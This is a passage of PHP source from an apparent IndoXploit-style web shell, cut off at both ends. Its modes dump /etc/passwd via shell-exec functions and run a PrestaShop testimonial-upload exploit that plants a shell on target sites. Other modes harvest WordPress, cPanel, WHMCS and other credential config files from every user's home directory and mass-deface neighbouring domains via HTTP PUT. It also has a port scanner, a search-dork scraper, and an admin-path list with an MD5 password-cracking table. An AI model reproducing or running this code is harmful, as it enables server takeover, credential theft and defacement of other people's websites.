    echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
    echo "</textarea><br>";
    }
    if ($_POST['systuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo system("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['passthuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo passthru("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['exuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo exec("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['shexuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo shell_exec("ls /var/mail");
    echo "</textarea><br>";
    }
    if($_POST['syst'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo system("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['passth'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo passthru("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['ex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo exec("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['shex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo shell_exec("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    echo '<center>';
    if($_POST['melex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    for($uid=0;$uid<60000;$uid++){ 
    $ara = posix_getpwuid($uid);
    if (!empty($ara)) {
    while (list ($key, $val) = each($ara)){
    print "$val:";
    }
    print "\n";
    }
    }
    echo"</textarea><br><br>";
    }
    } elseif($_GET['do'] == 'presta')
    {	
    ?>
    <table width="100%" align="center">
    <form method="post" action="" enctype="multipart/form-data">
    <tr><td><pre>Filename   : <input type="text" name="filename" placeholder="idx.php" required></td></tr>
    <tr><td><pre>Script     : <br><textarea placeholder="Hacked by l0c4lh34rtz - IndoXploit" name="source" required></textarea></td>
    <td><pre>Target     : <br><textarea placeholder="www.target.com" name="target" required></textarea></td>
    </tr>
    <tr><td><input type="submit" class="btn" name="exploit" value="Xploit"></td></tr>
    </form>
    </table>
    <div style='margin: 5px auto; padding-left: 15px;'>
    <?php
    set_time_limit(0);
    error_reporting(0);
    
    function curl($url,$post,$data,$headers,$header,$cookie) {
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
              curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
              curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        if($post) {
               curl_setopt($ch, CURLOPT_POST, true);
              curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        if($cookie) {
              curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
        } else {
              curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
        }
        if($headers) {
              curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
        }
        $exec = curl_exec($ch);
        $info = curl_getinfo($ch);
        return array(
            "http" => $info['http_code'],
            "response" => $exec
        );
              curl_close($ch);
    }
    
    $filename = htmlspecialchars($_POST['filename']);
    $script = $_POST['source'];
    $domains = explode("\r\n", htmlspecialchars($_POST['target']));
    $go = $_POST['exploit'];
    
    if(isset($go)) {
        $handle = fopen($filename, "w");
        fwrite($handle, $script);
        fclose($handle);
    
        foreach($domains as $target) {
            if(!preg_match("/^http:\/\//", $target) AND !preg_match("/^https:\/\//", $target)) {
                $target = "http://$target/";
            }
            echo "[+] URL: $target<br>";
            $post = array(
                "testimonial_submitter_name" => "indoxploit",
                "testimonial_title" => "hacked by indoxploit",
                "testimonial_main_message" => "hacked by indoxploit",
                "testimonial_img" => "@$filename",
                "testimonial" => "Submit Testimonial",
            );
            $exploit = curl("$target/modules/blocktestimonial/addtestimonial.php", TRUE, $post, FALSE, NULL, TRUE);
            $cek_shell = curl("$target/upload/$filename", FALSE, NULL, FALSE, NULL, FALSE);
            if(preg_match("/Your testimonial was submitted successfully./", $exploit['response'])) {
                echo "[+] Successfully !<br>";
                if($cek_shell['http'] == 200) {
                    echo "[+] $target/upload/$filename<br><br>";
                } else {
                    echo "[+] Shell not Found :(<br><br>";
                }
            } else {
                echo "[+] Fail :(<br><br>";
            }
        }
    }
    }
    
    elseif($_GET['do'] == 'configv2') {
        if($_POST){
            $passwd = $_POST['passwd'];
            mkdir("pain_config", 0777);
            $isi_htc = "Options all\nRequire None\nSatisfy Any";
            $htc = fopen("pain_config/.htaccess","w");
            fwrite($htc, $isi_htc);
            preg_match_all('/(.*?):x:/', $passwd, $user_config);
            foreach($user_config[1] as $user_pain) {
                $user_config_dir = "/home/$user_pain/public_html/";
                if(is_readable($user_config_dir)) {
                    $grab_config = array(
                        "/home/$user_pain/.my.cnf" => "cpanel",
                        "/home/$user_pain/.accesshash" => "WHM-accesshash",
                        "/home/$user_pain/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home/$user_pain/public_html/config/koneksi.php" => "Lokomedia",
                        "/home/$user_pain/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home/$user_pain/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home/$user_pain/public_html/whm/configuration.php" => "WHMCS",
                        "/home/$user_pain/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home/$user_pain/public_html/forum/config.php" => "phpBB",
                        "/home/$user_pain/public_html/sites/default/settings.php" => "Drupal",
                        "/home/$user_pain/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home/$user_pain/public_html/app/etc/local.xml" => "Magento",
                        "/home/$user_pain/public_html/joomla/configuration.php" => "Joomla",
                        "/home/$user_pain/public_html/configuration.php" => "Joomla",
                        "/home/$user_pain/public_html/wp/wp-config.php" => "WordPress",
                        "/home/$user_pain/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home/$user_pain/public_html/wp-config.php" => "WordPress",
                        "/home/$user_pain/public_html/admin/config.php" => "OpenCart",
                        "/home/$user_pain/public_html/slconfig.php" => "Sitelok",
                        "/home/$user_pain/public_html/application/config/database.php" => "Ellislab",
                        "/home1/$user_pain/.my.cnf" => "cpanel",
                        "/home1/$user_pain/.accesshash" => "WHM-accesshash",
                        "/home1/$user_pain/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home1/$user_pain/public_html/config/koneksi.php" => "Lokomedia",
                        "/home1/$user_pain/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home1/$user_pain/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home1/$user_pain/public_html/whm/configuration.php" => "WHMCS",
                        "/home1/$user_pain/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home1/$user_pain/public_html/forum/config.php" => "phpBB",
                        "/home1/$user_pain/public_html/sites/default/settings.php" => "Drupal",						"/home1/$user_pain/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home1/$user_pain/public_html/app/etc/local.xml" => "Magento",
                        "/home1/$user_pain/public_html/joomla/configuration.php" => "Joomla",
                        "/home1/$user_pain/public_html/configuration.php" => "Joomla",
                        "/home1/$user_pain/public_html/wp/wp-config.php" => "WordPress",
                        "/home1/$user_pain/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home1/$user_pain/public_html/wp-config.php" => "WordPress",
                        "/home1/$user_pain/public_html/admin/config.php" => "OpenCart",
                        "/home1/$user_pain/public_html/slconfig.php" => "Sitelok",
                        "/home1/$user_pain/public_html/application/config/database.php" => "Ellislab",
                        "/home2/$user_pain/.my.cnf" => "cpanel",
                        "/home2/$user_pain/.accesshash" => "WHM-accesshash",
                        "/home2/$user_pain/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home2/$user_pain/public_html/config/koneksi.php" => "Lokomedia",
                        "/home2/$user_pain/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home2/$user_pain/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home2/$user_pain/public_html/whm/configuration.php" => "WHMCS",
                        "/home2/$user_pain/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home2/$user_pain/public_html/forum/config.php" => "phpBB",
                        "/home2/$user_pain/public_html/sites/default/settings.php" => "Drupal",
                        "/home2/$user_pain/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home2/$user_pain/public_html/app/etc/local.xml" => "Magento",
                        "/home2/$user_pain/public_html/joomla/configuration.php" => "Joomla",
                        "/home2/$user_pain/public_html/configuration.php" => "Joomla",
                        "/home2/$user_pain/public_html/wp/wp-config.php" => "WordPress",
                        "/home2/$user_pain/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home2/$user_pain/public_html/wp-config.php" => "WordPress",
                        "/home2/$user_pain/public_html/admin/config.php" => "OpenCart",
                        "/home2/$user_pain/public_html/slconfig.php" => "Sitelok",
                        "/home2/$user_pain/public_html/application/config/database.php" => "Ellislab",
                        "/home3/$user_pain/.my.cnf" => "cpanel",
                        "/home3/$user_pain/.accesshash" => "WHM-accesshash",
                        "/home3/$user_pain/public_html/bw-configs/config.ini" => "BosWeb",
                        "/home3/$user_pain/public_html/config/koneksi.php" => "Lokomedia",
                        "/home3/$user_pain/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
                        "/home3/$user_pain/public_html/clientarea/configuration.php" => "WHMCS",
                        "/home3/$user_pain/public_html/whm/configuration.php" => "WHMCS",
                        "/home3/$user_pain/public_html/whmcs/configuration.php" => "WHMCS",
                        "/home3/$user_pain/public_html/forum/config.php" => "phpBB",
                        "/home3/$user_pain/public_html/sites/default/settings.php" => "Drupal",
                        "/home3/$user_pain/public_html/config/settings.inc.php" => "PrestaShop",
                        "/home3/$user_pain/public_html/app/etc/local.xml" => "Magento",
                        "/home3/$user_pain/public_html/joomla/configuration.php" => "Joomla",
                        "/home3/$user_pain/public_html/configuration.php" => "Joomla",
                        "/home3/$user_pain/public_html/wp/wp-config.php" => "WordPress",
                        "/home3/$user_pain/public_html/wordpress/wp-config.php" => "WordPress",
                        "/home3/$user_pain/public_html/wp-config.php" => "WordPress",
                        "/home3/$user_pain/public_html/admin/config.php" => "OpenCart",
                        "/home3/$user_pain/public_html/slconfig.php" => "Sitelok",
                        "/home3/$user_pain/public_html/application/config/database.php" => "Ellislab"
                            );	
                        foreach($grab_config as $config => $nama_config) {
                            $ambil_config = file_get_contents($config);
                            if($ambil_config == '') {
                            } else {
                                $file_config = fopen("pain_config/$user_pain-$nama_config.txt","w");
                                fputs($file_config,$ambil_config);
                            }
                        }
                    }		
                }
                echo "<center><a href='?dir=$dir/pain_config'><font color=lime>Done</font></a></center>";
                }else{
                    
            echo "<form method=\"post\" action=\"\"><center>etc/passw ( Error ? <a href='?dir=$dir&do=passwbypass'>Bypass Here</a> )<br><textarea name=\"passwd\" class='area' rows='15' cols='60'>\n";
            echo file_get_contents('/etc/passwd'); 
            echo "</textarea><br><input type=\"submit\" value=\"GassPoll\"></td></tr></center>\n";
            }
    } elseif($_GET['do'] == 'cs')
    {	
    echo '<html>
    <center><br>
    <font size="3">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
    <br><br>
    <form method="post" style="font-size:25px;">
    URL: <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
    POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
    <input type="submit" name="d" value="Lock!">
    </form>';
    $url = $_POST["url"];
    $pf = $_POST["pf"];
    $d = $_POST["d"];
    if($d) {
        echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form>";
    }
    
    
    }elseif($_GET['do'] == 'ports') {
        echo '<table><tr><th><center><u>Port Scanner</u></tr></th></center><td>';
        echo '<div class="content">';
        echo '<form action="" method="post">';
        
        if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
            $start = strip_tags($_POST['start']);
            $end = strip_tags($_POST['end']);
            $host = strip_tags($_POST['host']);
            for($i = $start; $i<=$end; $i++){
                $fp = @fsockopen($host, $i, $errno, $errstr, 3);
                if($fp){
                    echo 'Port '.$i.' is <font color=green>open</font><br>';
                }
                flush();
            }
        } else {
            echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
                  <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
                  <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
                  Host: <input type="text" name="host" value="localhost"/><br /><br />
                  Port start: <input type="text" name="start" value="0"/><br /><br />
                  Port end:<input type="text" name="end" value="5000"/><br /><br />
                  <input type="submit" value="Scan Ports" />
                  </form></center><br /><br />';
        echo '</div></table></td>';
    
    }
    
    } elseif($_GET['do'] == 'upload') {
        echo "<center>";
        if($_POST['upload']) {
            if($_POST['tipe_upload'] == 'biasa') {
                if(@copy($_FILES['ix_file']['tmp_name'], "$dir/".$_FILES['ix_file']['name']."")) {
                    $act = "<font color=lime>Uploaded!</font> at <i><b>$dir/".$_FILES['ix_file']['name']."</b></i>";
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            } else {
                $root = $_SERVER['DOCUMENT_ROOT']."/".$_FILES['ix_file']['name'];
                $web = $_SERVER['HTTP_HOST']."/".$_FILES['ix_file']['name'];
                if(is_writable($_SERVER['DOCUMENT_ROOT'])) {
                    if(@copy($_FILES['ix_file']['tmp_name'], $root)) {
                        $act = "<font color=lime>Uploaded!</font> at <i><b>$root -> </b></i><a href='http://$web' target='_blank'>$web</a>";
                    } else {
                        $act = "<font color=red>failed to upload file</font>";
                    }
                } else {
                    $act = "<font color=red>failed to upload file</font>";
                }
            }
        }
        echo "Upload File:
        <form method='post' enctype='multipart/form-data'>
        <input type='radio' name='tipe_upload' value='biasa' checked>Biasa [ ".w($dir,"Writeable")." ]
        <input type='radio' name='tipe_upload' value='home_root'>home_root [ ".w($_SERVER['DOCUMENT_ROOT'],"Writeable")." ]<br>
        <input type='file' name='ix_file'>
        <input type='submit' value='upload' name='upload'>
        </form>";
        echo $act;
        echo "</center>";
    } elseif($_GET['do'] == 'web') {
    set_time_limit(0);
    function reverse($url) {
        $ch = curl_init("http://domains.yougetsignal.com/domains.php");
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
              curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
              curl_setopt($ch, CURLOPT_HEADER, 0);
              curl_setopt($ch, CURLOPT_POST, 1);
        $resp = curl_exec($ch);
        $resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
        $array = explode(",,", $resp);
        unset($array[0]);
        foreach($array as $lnk) {
            $lnk = "http://$lnk";
            $lnk = str_replace(",", "", $lnk);
            echo $lnk."\n";
            ob_flush();
            flush();
        }
              curl_close($ch);
    }
    function dav($url, $file) {
        $fp = fopen($file, "r");
        $filesize = filesize($file);
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_PUT, true);
              curl_setopt($ch, CURLOPT_INFILE, $fp);
              curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
              curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
              curl_setopt($ch, CURLOPT_COOKIESESSION, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        return curl_exec($ch);
              curl_close($ch);
    }
    function cek($url) {
        $ch = curl_init($url);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $resp = curl_exec($ch);
        return $resp;
    }
    
    $sites = explode("\r\n", $_POST['url']);
    $f = htmlspecialchars($_POST['file_deface']);
    if($_POST['hajar']) {
        foreach($sites as $url) {
            $link = $url."/".$f;
            $fp = fopen($f, "r");
            $filesize = filesize($f);
            $ch = curl_init();
                  curl_setopt($ch, CURLOPT_URL, $link);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                  curl_setopt($ch, CURLOPT_PUT, true);
                  curl_setopt($ch, CURLOPT_INFILE, $fp);
                  curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
                  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            $res = curl_exec($ch);
            $cek = cek($link);
            if(preg_match("/hacked/i", $cek)) {
                echo "exploited! -> <a href='$link' target='_blank'>$link</a><br>";
            }
        }
    } else {
    ?>
    <form method="post">
    File Deface: <br>
    <input type="text" name="file_deface" placeholder="deface.html" value="deface.html" required><br>
    Domains: <br>
    <textarea name="url"><?php reverse($_SERVER['HTTP_HOST']); ?></textarea><br>
    <input type="submit" name="hajar" value="Xploit!">
    </form>
    </center>
    <?php
    }
    } elseif($_GET['do'] == 'bing') {
    ?>
    <form method="post">
    Bing Dork: <input type="text" name="dork" placeholder="dork" required>
    <input type="submit" name="go" value=">>">
    </form>
    <?php
    // coded by Mr. Magnom 
    // Re-Coded to Web Based by Mr. Error 404 - IndoXploit
    // greetz to Mr. Magnom - Sanjungan Jiwa
    function getsource($url, $proxy) {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        if($proxy) {
            $proxy = explode(':', autoprox());
            curl_setopt($curl, CURLOPT_PROXY, $proxy[0]);
            curl_setopt($curl, CURLOPT_PROXYPORT, $proxy[1]);
        }
        $content = curl_exec($curl);
        curl_close($curl);
        return $content;
    }
    $dork = htmlspecialchars($_POST['dork']);
    $do = urlencode($dork);
    if(isset($_POST['go'])) {
        $npage = 1;
        $npages = 30000;
        $allLinks = array();
        $lll = array();
        while($npage <= $npages) {
            $x = getsource("http://www.bing.com/search?q=".$do."&first=".$npage."", $proxy);
            if($x) {
                preg_match_all('#<h2><a href="(.*?)" h="ID#', $x, $findlink);
                foreach ($findlink[1] as $fl) array_push($allLinks, $fl);
                $npage = $npage + 10;
                if (preg_match("(first=" . $npage . "&amp)siU", $x, $linksuiv) == 0) break;
            } else break;
        }
        $URLs = array();
        foreach($allLinks as $url){
            $exp = explode("/", $url);
            $URLs[] = $exp[2];
        }
        $array = array_filter($URLs);
        $array = array_unique($array);
        $sss = count(array_unique($array));
        echo "ToTaL SiTe : $sss<br>";
        foreach($array as $domain) {
            echo "http://$domain/<br>";
        }
    }
    } elseif($_GET['do'] == 'lokomedia') {
    
    ?><center>
    <form method="post">
    <textarea name="target" placeholder="http://www.target.com/" style="width: 500px; height: 250px;" required></textarea><br>
    <input type="submit" name="go" value="Xploit" style="width: 500px;">
    </form></center>
    <?php
    function ngcurl($url) {
        $curl = curl_init($url);
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        $content = curl_exec($curl);
        curl_close($curl);
        return $content;
    }
    $admin = array(
    'adm/',
    '_adm_/',
    '_admin_/',
    '_administrator_/',
    'operator/',
    'sika/',
    'develop/',
    'ketua/',
    'redaktur/',
    'author',
    'admin/',
    'administrator/',
    'adminweb/',
    'user/',
    'users/',
    'dinkesadmin/',
    'retel/',
    'author/',
    'panel/',
    'paneladmin/',
    'panellogin/',
    'redaksi/',
    'cp-admin/',
    'master/',
    'master/index.php',
    'master/login.php',
    'operator/index.php',
    'sika/index.php',
    'develop/index.php',
    'ketua/index.php',
    'redaktur/index.php',
    'admin/index.php',
    'administrator/index.php',
    'adminweb/index.php',
    'user/index.php',
    'users/index.php',
    'dinkesadmin/index.php',
    'retel/index.php',
    'author/index.php',
    'panel/index.php',
    'paneladmin/index.php',
    'panellogin/index.php',
    'redaksi/index.php',
    'cp-admin/index.php',
    'operator/login.php',
    'sika/login.php',
    'develop/login.php',
    'ketua/login.php',
    'redaktur/login.php',
    'admin/login.php',
    'administrator/login.php',
    'adminweb/login.php',
    'user/login.php',
    'users/login.php',
    'dinkesadmin/login.php',
    'retel/login.php',
    'author/login.php',
    'panel/login.php',
    'paneladmin/login.php',
    'panellogin/login.php',
    'redaksi/login.php',
    'cp-admin/login.php',
    'terasadmin/',
    'terasadmin/index.php',
    'terasadmin/login.php',
    'rahasia/',
    'rahasia/index.php',
    'rahasia/admin.php',
    'rahasia/login.php',
    'dinkesadmin/',
    'dinkesadmin/login.php',
    'adminpmb/',
    'adminpmb/index.php',
    'adminpmb/login.php',
    'system/',
    'system/index.php',
    'system/login.php',
    'webadmin/',
    'webadmin/index.php',
    'webadmin/login.php',
    'wpanel/',
    'wpanel/index.php',
    'wpanel/login.php',
    'adminpanel/index.php',
    'adminpanel/',
    'adminpanel/login.php',
    'adminkec/',
    'adminkec/index.php',
    'adminkec/login.php',
    'admindesa/',
    'admindesa/index.php',
    'admindesa/login.php',
    'adminkota/',
    'adminkota/index.php',
    'adminkota/login.php',
    'admin123/',
    'admin123/index.php',
    'admin123/login.php',
    'logout/',
    'logout/index.php',
    'logout/login.php',
    'logout/admin.php',
    'adminweb_setting',
    );
    $real_pass = array(
    "a66abb5684c45962d887564f08346e8d" => "admin123456",
    "99026ab4ab3de96f3d7ae33c8c85057b" => "master!@#$qwe",
    "c630643500720b255abb22e2ab2c31f6" => "sumedang123",
    "1c63129ae9db9c60c3e8aa94d3e00495" => "1qaz2wsx", 
    "f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
    "93261ae77f0df5522dd9767203f3aa17" => "house69",
    "f243df64be7184fb0fc07bd6cf53185b" => "b1smillah",
    "37c77ada62ec68d1b740717fc886bef6" => "Suk4bum1",
    "d39b59b946b414c4e5926f9c7b23840a" => "kasitaugakya",
    "fbff29af096fa646757ce8439b644714" => "vro190588",
    "1feadc10e93f2b64c65868132f1e72d3" => "agoes",
    "0192023a7bbd73250516f069df18b500" => "admin123",
    "7aa1dfee8619ac8f282e296d83eb55ff" => "meong",
    "24fa5ee2c1285e115dd6b5fe1c25a333" => "773062",
    "d557fd4686821b5d8b927cdfe6e67d21" => "#admin#",
    "5fec4ba8376f207d1ff2f0cac0882b01" => "admin!@#",
    "a01726b559eeeb5fc287bf0098a22f6c" => "@dm1n",
    "73acd9a5972130b75066c82595a1fae3" => "ADMIN",
    "511f2efed0e465e700a951f2f1ecec19" => "bs1unt46",
    "7b7bc2512ee1fedcd76bdc68926d4f7b" => "Administrator",
    "99fedb09f0f5da90e577784e5f9fdc23" => "ADMINISTRATOR",
    "e58bfd635502ea963e1d52487ac2edfa" => "!@#123!@#123",
    "5449ccea16d1cc73990727cd835e45b5" => "ngadimin",
    "c21f969b5f03d33d43e04f8f136e7682" => "default",
    "1a1dc91c907325c69271ddf0c944bc72" => "pass",
    "fffdf0489f264598e9d35cba0381e9ac" => "sukmapts",
    "5f4dcc3b5aa765d61d8327deb882cf99" => "password",
    "5ebe2294ecd0e0f08eab7690d2a6ee69" => "secret",
    "c893bad68927b457dbed39460e6afd62" => "prueba",
    "b2ca9cfa6067282a031d28a54886822d" => "admin4343",
    "3a3795bb61d5377545b4f345ff223e3d" => "bingo",
    "e172dd95f4feb21412a692e73929961e" => "bismillah",
    "8221303fbf816fd9da96be7dd4c92f99" => "salawarhandap123",
    "0570e3795fbe97ddd3ce53be141d1aed" => "indoxploit",
    "098f6bcd4621d373cade4e832627b4f6" => "test",   
    "976adc43eaf39b180d9f2c624a1712cd" => "adminppcp",
    "5985609a2dc01098797c94a43e0a1115" => "masarief",
    "21232f297a57a5a743894a0e4a801fc3" => "admin",
    "1870a829d9bc69abf500eca6f00241fe" => "wordpress",
    "126ac9f6149081eb0e97c2e939eaad52" => "blog",
    "fe01ce2a7fbac8fafaed7c982a04e229" => "demo",
    "04e484000489dd3b3fb25f9aa65305c6" => "redaksi2016",
    "91f5167c34c400758115c2a6826ec2e3" => "administrador",
    "200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
    "c93ccd78b2076528346216b3b2f701e6" => "admin1234",
    "912ec803b2ce49e4a541068d495ab570" => "asdf",
    "1adbb3178591fd5bb0c248518f39bf6d" => "asdf1234",
    "e99a18c428cb38d5f260853678922e03" => "abc123",
    "a152e841783914146e4bcd4f39100686" => "asdfgh",
    "a384b6463fc216a5f8ecb6670f86456a" => "qwert",
    "d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
    "b59c67bf196a4758191e42f76670ceba" => "1111",
    "96e79218965eb72c92a549dd5a330112" => "111111",
    "4297f44b13955235245b2497399d7a93" => "123123",
    "c33367701511b4f6020ec61ded352059" => "654321",
    "81dc9bdb52d04dc20036dbd8313ed055" => "1234",
    "e10adc3949ba59abbe56e057f20f883e" => "123456",
    "fcea920f7412b5da7be0cf42b8c93759" => "1234567",
    "25d55ad283aa400af464c76d713c07ad" => "12345678",
    "25f9e794323b453885f5181f1b624d0b" => "123456789",
    "e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
    "befe9f8a14346e3e52c762f333395796" => "qawsed",
    "76419c58730d9f35de7ac538c2fd6737" => "qazwsx",
    "5f4dcc3b5aa765d61d8327deb882cf99" => "password",
    "bed128365216c019988915ed3add75fb" => "passw0rd",
    "21232f297a57a5a743894a0e4a801fc3" => "admin",
    "e10adc3949ba59abbe56e057f20f883e" => "123456",
    "5f4dcc3b5aa765d61d8327deb882cf99" => "password",
    "25d55ad283aa400af464c76d713c07ad" => "12345678",
    "f379eaf3c831b04de153469d1bec345e" => "666666",
    "96e79218965eb72c92a549dd5a330112" => "111111",
    "fcea920f7412b5da7be0cf42b8c93759" => "1234567",
    "d8578edf8458ce06fbc5bb76a58c5ca4" => "qwerty",
    "6f3cac6213ffceee27cc85414f458caa" => "siteadmin",
    "200ceb26807d6bf99fd6f4f0d1ca54d4" => "administrator",
    "63a9f0ea7bb98050796b649e85481845" => "root",
    "4297f44b13955235245b2497399d7a93" => "123123",
    "c8837b23ff8aaa8a2dde915473ce0991" => "123321",
    "e807f1fcf82d132f9bb018ca6738a19f" => "1234567890",
    "4ca7c5c27c2314eecc71f67501abb724" => "letmein123",
    "cc03e747a6afbbcbf8be7668acfebee5" => "test123",
    "62cc2d8b4bf2d8728120d052163a77df" => "demo123",
    "32250170a0dca92d53ec9624f336ca24" => "pass123",
    "46f94c8de14fb36680850768ff1b7f2a" => "123qwe",
    "200820e3227815ed1756a6b531e7e0d2" => "qwe123",
    "c33367701511b4f6020ec61ded352059" => "654321",
    "f74a10e1d6b2f32a47b8bcb53dac5345" => "loveyou",
    "172eee54aa664e9dd0536b063796e54e" => "adminadmin123",
    "e924e336dcc4126334c852eb8fadd334" => "waskita1234",
    "02631cc1d0cc5bda188566e90d0ae16c" => "rsamku2013",
    "b69cbef044eac6fc514a2988e62c5b30" => "unlock08804",
    "12e110a1b89da9b09a191f1f9b0a1398" => "nalaratih",
    "f70d32432ff0a8984b5aadeb159f9db6" => "Much240316",
    "a2fffa77aa0dde8cd4c416b5114eba21" => "gondola",
    "2b45af95ce316ea4cffd2ce4093a2b83" => "w4nd3szaki",
    "c5612a125d8613ddae79a6b36c8bee37" => "Reddevil#21",
    "6e7fbe8e6147e2c430ce7e8ab883e533" => "R4nd0m?!",
    "5136850b6c8f3ebc66122188347efda0" => "adminku",
    "5214905fbe8d7f0bb0d0a328f08af3f0" => "adminpust4k4",
    "acfc976c2d22e4a595a9ee6fc0d05f27" => "dikmen2016",
    "dcdee606657b5f7d8b218badfeb22a90" => "masputradmin",
    "ecb4208ee41389259a632d3a733c2786" => "741908",
    "827ccb0eea8a706c4c34a16891f84e7b" => "12345",
    "855be097acdf2fea4e342615a154ca3c" => "tolol",
    "eeee80342778e7b497d507f89094b10d" => "master10",
    "d29c0398602e6cf005f0dcb7a0443c7d" => "adminjalan",
    "9062756924cf10763cc89cf2793a77ab" => "pass4@nd1",
    "8b6bc5d8046c8466359d3ac43ce362ab" => "ganteng",
    "528d06a172eb2d8fab4e93f33f3986a8" => "jasindolive",
    "058fe7f85df1e992ef7bf948f1db7842" => "404J",
    "abe1f4492f922a9111317ed7f7f8e723" => "bantarjati5",
    );
    $sites = explode("\r\n", htmlspecialchars($_POST['target']));
    if(isset($_POST['go'])) {
        foreach($sites as $url) {
            if(!preg_match("/^http:\/\//", $url) AND !preg_match("/^https:\/\//", $url)) {
                $url = "http://$url";
            } else {
                $url = $url;
            }
            $statis = "";
            $sisa = "";
            $login = "";
            $param_list = array("statis","kategori","berita");
            $curl = ngcurl($url);
            $curl = str_replace("'", '"', $curl);
